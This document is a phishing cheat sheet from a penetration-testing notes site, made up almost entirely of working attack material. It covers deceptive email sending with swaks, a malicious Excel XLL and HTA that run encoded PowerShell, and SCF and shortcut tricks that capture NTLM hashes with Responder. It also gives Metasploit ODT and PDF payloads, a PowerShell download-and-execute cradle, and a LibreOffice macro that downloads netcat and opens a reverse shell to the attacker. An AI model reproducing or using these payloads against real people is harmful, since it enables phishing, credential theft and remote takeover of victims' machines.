---
title: "Phishing"
tags: ["Phishing", "Social Engineering", "Responder", "Phishing Campaigns", "Email", "xll", "Excel", "hta", "Shortcut", "Windows", "odt", "Libre", "vba", "NTLM Theft", "pdf", "NTLM"]
---

### Send Email

```console
swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'Check this out: http://<LOCAL_IP>:<PORT>' --attach '@<FILE>'
```

---

{{< tab set1 tab1 >}}lnk{{< /tab >}}
{{< tab set1 tab2 >}}xll{{< /tab >}}
{{< tab set1 tab3 >}}hta{{< /tab >}}
{{< tab set1 tab4 >}}scf{{< /tab >}}
{{< tab set1 tab5 >}}odt{{< /tab >}}
{{< tab set1 tab6 >}}pdf{{< /tab >}}
{{< tab set1 tab7 >}}others{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
$obj = New-Object -ComObject WScript.Shell
```

```console
$link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk")
```

```console
$link.TargetPath = "C:\ProgramData\rev.exe"
```

```console
$link.Save()
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### shell.c

```console
#include <windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("<POWERSHELL_3_BASE64>", 1); // Replace your payload
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

#### 1. Compile in Linux

```console
x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
```

#### 2. Send Email

```console
swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'This is not a malicious file' --attach '@shell.xll'
```

<small>*Ref: [revshells.com](https://www.revshells.com/)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

#### 1. Start a Local SMB Server

```console
# In our local Linux machine
impacket-smbserver -smb2support share .
```

#### 2. Create a Malicious hta File in Local Linux SMB Share

```console
<html>
    <head>
        <HTA:APPLICATION ID="shell">
        <script language="javascript">
            var c = "<POWERSHELL_3_BASE64>";  
            new ActiveXObject('WScript.Shell').Run(c, 0, true); 
        </script>
    </head>
    <body>
        <script>self.close();</script>
    </body>
</html>
```

#### 3. Create a Shortcut File in Target Windows

```console
# In target Windows machine (powershell)
$url = "file://<LOCAL_IP>/share/shell.hta"
```

```console
$shortcutPath = "C:\ProgramData\shell.url"
```

```console
$shortcutContent = "[InternetShortcut]`r`nURL=$url"
```

```console
Set-Content -Path $shortcutPath -Value $shortcutContent
```

<small>*Ref: [revshells.com](https://www.revshells.com/)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab4 >}}

#### 1. Start Responder

```console
# In our local Linux machine
sudo responder -I tun0
```

#### 2. Create a Malicious Shortcut

```console
[Shell]
Command=2

IconFile=\\<LOCAL_IP>\icon
```

#### 3. Upload the Malicious Shortcut

```console
# In our local Linux machine
smbclient -N \\\\<TARGET>\\share\\
```

```console
mput evil.scf
```

{{< /tabcontent >}}
{{< tabcontent set1 tab5 >}}

### Metasploit

#### Capture NTLM

```console
# Start responder
sudo responder -I <INTERFACE>
```

```console {class="sample-code"}
sudo responder -I tun0
```

```console
# File write require root privilege
sudo msfconsole -q
```

```console
use auxiliary/fileformat/odt_badodt
```

```console
set lhost <LOCAL_IP>
run
```

#### RCE

```console
# Start http server
python3 -m http.server <PORT>
```

```console
# Start listener
rlwrap ncat -lvnp <LOCAL_PORT>
```

```console
# msfconsole
use multi/misc/openoffice_document_macro
```

```console
set payload windows/x64/exec
set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<PORT>/<SHELL_SCRIPT>');"
set srvhost <LOCAL_IP>
set lhost <LOCAL_IP>
run
```

---

### Manual

```console
+--------------------------------------------------------+
| 1. "Tools" > "Macros" > "Organize Macros" > "Basic..." |
| 2. "Untitled 1" > "Standard" > "New"                   |
| 3. "Paste the code below"                              |
+--------------------------------------------------------+
```

<br>

```console
Sub OnLoad
    shell("cmd /c certutil -urlcache -split -f http://<LOCAL_IP>:<PORT>/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd <LOCAL_IP> <LOCAL_PORT>")
End Sub
```

<br>

```console
+-----------------------------------------------------------+
| 4. "Tools" > "Organize Macros" > "Basic..." > "Assign..." |
| 5. "Events" > "Open Document" > "OK"                      |
| 6. "SAVE"                                                 |
+-----------------------------------------------------------+
```

{{< /tabcontent >}}
{{< tabcontent set1 tab6 >}}

```console
msfconsole -q
```

```console
use auxiliary/fileformat/badpdf
```

```console
set filename evil.pdf
set lhost <LOCAL_IP>
run
```

{{< /tabcontent >}}
{{< tabcontent set1 tab7 >}}

```console
python3 ntlm_theft.py -g all -s <LOCAL_IP> -f <OUTPUT>
```

<small>*Ref: [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)*</small>

```console
python3 hashgrab.py <LOCAL_IP> <OUTPUT>
```

<small>*Ref: [hashgrab](https://github.com/xct/hashgrab)*</small>

{{< /tabcontent >}}

